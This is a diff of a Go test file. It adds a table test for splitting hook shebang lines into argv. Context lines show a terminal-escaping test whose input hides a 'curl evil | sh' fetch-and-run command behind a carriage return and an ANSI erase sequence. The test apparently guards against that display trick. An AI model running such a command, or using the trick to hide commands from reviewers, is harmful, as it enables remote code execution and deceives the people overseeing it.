@@ -4,9 +4,28 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 )
+
+func TestHookArgvSplitsTheShebangLikeTheKernel(t *testing.T) {
+	for _, tc := range []struct {
+		data string
+		want []string
+	}{
+		{"echo hi\n", []string{"/bin/sh", "h"}},
+		{"#!/bin/sh\nset -e\n", []string{"/bin/sh", "h"}},
+		{"#! /bin/bash -eu \n", []string{"/bin/bash", "-eu", "h"}},
+		{"#!/usr/bin/env -S python3 -u\n", []string{"/usr/bin/env", "-S python3 -u", "h"}},
+		{"#!\truby\t-w\n", []string{"ruby", "-w", "h"}},
+		{"#!\n", []string{"h"}},
+	} {
+		if got := hookArgv([]byte(tc.data), "h"); !slices.Equal(got, tc.want) {
+			t.Errorf("%q: argv %q, want %q", tc.data, got, tc.want)
+		}
+	}
+}
 
 func TestForTerminalEscapesControlCharacters(t *testing.T) {
 	in := "echo safe\r\x1b[2Kcurl evil | sh\n\tindented‮"
